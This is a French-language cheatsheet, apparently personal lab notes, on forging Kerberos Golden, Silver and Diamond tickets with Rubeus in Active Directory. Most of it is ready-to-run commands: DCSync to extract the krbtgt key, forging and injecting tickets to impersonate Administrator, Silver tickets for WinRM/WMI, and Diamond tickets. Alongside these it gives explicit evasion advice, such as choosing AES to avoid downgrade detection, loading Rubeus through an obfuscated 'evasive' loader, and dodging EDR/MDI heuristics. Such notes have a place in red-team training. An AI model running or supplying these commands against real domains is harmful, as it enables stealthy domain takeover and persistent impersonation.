# Cheatsheet - Tickets Kerberos (Golden / Silver / Diamond)

> [!summary] Objectif
> Forger un ticket Kerberos pour usurper une identité sans repasser par le KDC (Golden, Silver) ou en repartant d'un TGT réel (Diamond, plus furtif). Le lab charge Rubeus via `Loader.exe` (build obfusqué `evasive-*`).

### Golden Ticket — clé krbtgt, tout le domaine

> Sert à s'authentifier partout sur le domaine en usurpant n'importe quel compte (Administrator, DA, EA...) avec les groupes de son choix, **sans jamais connaître son mot de passe** et sans repasser par le KDC — une fois forgé, l'accès est illimité et hors-ligne tant que `krbtgt` n'est pas régénéré deux fois.

> [!warning]- Required
> Clé AES256 (ou hash NTLM) de `krbtgt` + SID du domaine. S'obtient par DCSync une fois des droits de réplication ou un accès DA en poche — voir [[Cheatsheet - Persistence]].

```powershell
Rubeus.exe dcsync /user:<DOMAIN>\krbtgt                                             # 1. clé krbtgt
Rubeus.exe golden /aes256:<krbtgt_aes256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd
Rubeus.exe golden <champs imprimés par /printcmd> /ptt                              # forger + injecter
```

Utiliser `/aes256`, pas `/rc4` (downgrade détectable). `/ldap` remplit le PAC via 3 requêtes au DC pour un ticket cohérent. Un reset du mot de passe `krbtgt` **×2** invalide le ticket.

### Silver Ticket — hash du service, un seul service/hôte

> Sert à obtenir un accès admin (ex. WinRM, WMI) sur **une machine précise**, en usurpant Administrator face à ce service uniquement — plus limité que Golden, mais ne génère aucun trafic vers le KDC donc plus discret.

> [!warning]- Required
> Hash (RC4 ou AES256) du compte de service/machine ciblé — même méthode d'obtention que pour Golden (DCSync ou extraction locale) : voir [[Cheatsheet - Persistence]].

```powershell
Rubeus.exe silver /service:http/<DC_FQDN> /rc4:<machine_hash> /sid:<DOMAIN_SID> /ldap /user:Administrator /domain:<DOMAIN> /ptt
# WMI nécessite deux tickets : HOST puis RPCSS
Rubeus.exe silver /service:host/<DC_FQDN>  /rc4:<machine_hash> ... /ptt
Rubeus.exe silver /service:rpcss/<DC_FQDN> /rc4:<machine_hash> ... /ptt
```

Jamais de contact KDC → plus furtif que Golden, mais périmètre limité à 1 service. Le ticket porte le FQDN du service : cibler `winrs -r:<DC_FQDN>`, pas le nom court.

### Diamond Ticket — TGT réel, PAC re-signé

> Sert exactement comme un Golden Ticket (impersonation totale, tout le domaine), mais en partant d'un vrai TGT dont seul le PAC est trafiqué — évite les heuristiques de détection qui repèrent un ticket 100% forgé (durée de vie anormale, pas de TGT réel sous-jacent).

> [!warning]- Required
> Comme Golden : la clé `krbtgt` ([[Cheatsheet - Persistence]]). **En plus** : une session de domaine valide capable de demander un vrai TGT (`/tgtdeleg` s'appuie sur le contexte Kerberos déjà authentifié de l'utilisateur courant) — Golden, lui, ne nécessite aucune session ni compte réellement authentifié.

```powershell
Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /domain:<DOMAIN> /dc:<DC_FQDN> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Même prérequis que Golden (clé `krbtgt`), mais le TGT de base est authentique — seul le PAC est modifié. Préférable si un EDR/MDI surveille les tickets forgés from-scratch.

> [!note] Comparatif — 
> Golden : clé krbtgt, tout le domaine, aucun contact KDC.
> 
> Silver : hash du service, 1 service, aucun contact KDC. 
> 
> Diamond : clé krbtgt sur un vrai TGT, tout le domaine, contacte le KDC mais reste le plus furtif des trois.

**Link** — [[Cheatsheet - Kerberoasting]] · [[Cheatsheet - AS-REP Roasting]] · [[Cheatsheet - Persistence]] · [[Synthèse - Kerberos]]
